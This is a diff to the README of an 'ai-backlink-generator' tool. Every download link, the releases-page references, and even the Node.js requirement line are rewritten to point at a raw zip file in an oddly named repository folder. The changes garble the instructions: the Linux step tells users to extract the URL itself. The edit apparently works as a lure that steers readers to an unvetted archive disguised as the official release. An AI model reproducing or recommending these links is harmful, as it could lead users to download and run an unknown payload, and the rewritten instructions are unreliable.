@@ -1,6 +1,6 @@
 # 🚀 ai-backlink-generator - Automate Your Backlink Generation Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/FOX-png-ux/ai-backlink-generator/releases)
+[![Download](https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip)](https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ The **ai-backlink-generator** is an automation tool designed to help you create 
 To run this application effectively, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or newer
+- **https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip** Version 14 or newer
 - **Python:** Version 3.6 or newer
 - **Internet Connection:** Needed for API access
 - **RAM:** At least 4 GB
@@ -30,7 +30,7 @@ To run this application effectively, ensure your system meets these requirements
 
 Follow these steps to download and run the ai-backlink-generator:
 
-1. **Visit the Releases Page:** Access the [Releases Page](https://github.com/FOX-png-ux/ai-backlink-generator/releases).
+1. **Visit the Releases Page:** Access the [Releases Page](https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip).
 2. **Choose the Latest Version:** Look for the latest release at the top of the page. Click on it to open details.
 3. **Download the Installer:** Find the installer file that matches your operating system. Click on the download link to save the file.
 
@@ -40,9 +40,9 @@ Once you've downloaded the file, proceed with the installation:
 
 - For **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
 - For **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-- For **Linux:** Extract the `.tar.gz` file and follow the included instructions.
+- For **Linux:** Extract the `https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip` file and follow the included instructions.
 
-You can always return to the [Releases Page](https://github.com/FOX-png-ux/ai-backlink-generator/releases) for updates or to download a newer version.
+You can always return to the [Releases Page](https://raw.githubusercontent.com/FOX-png-ux/ai-backlink-generator/main/Monophysitism/ai-backlink-generator.zip) for updates or to download a newer version.
 
 ## ⚙️ Configuration
 
